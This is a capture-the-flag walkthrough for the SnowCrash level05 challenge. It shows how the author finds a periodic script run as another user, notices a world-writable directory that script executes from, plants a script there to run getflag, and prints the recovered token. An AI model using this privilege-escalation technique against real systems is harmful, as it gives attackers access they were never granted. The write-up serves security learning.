# Level 05

## Initial Reconnaissance
There aren't files in the home of level05 user. But like level00, we can search for files owned by flag05.

```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

## Vulnerability Found
It looks like there is a service running everything in /opt/openarenaserver, very likely as user flag05.

```
level05@SnowCrash:/opt/openarenaserver$ ls -al
total 0
drwxrwxr-x+ 2 root root 40 Jun 27 10:24 .
drwxr-xr-x  1 root root 60 Jun 27 10:24 ..
```

We can see that we have write access to the directory.

## Exploitation Steps

Let's write a simple script that will execute the getflag command and save the output in a file.

```bash
echo -e '#!/bin/bash\ngetflag > /tmp/flag.txt' > /opt/openarenaserver/rungetflag.sh
chmod +x /opt/openarenaserver/rungetflag.sh
```

After waiting a few seconds, we can see that the file has been executed.

```
level05@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Additional Notes

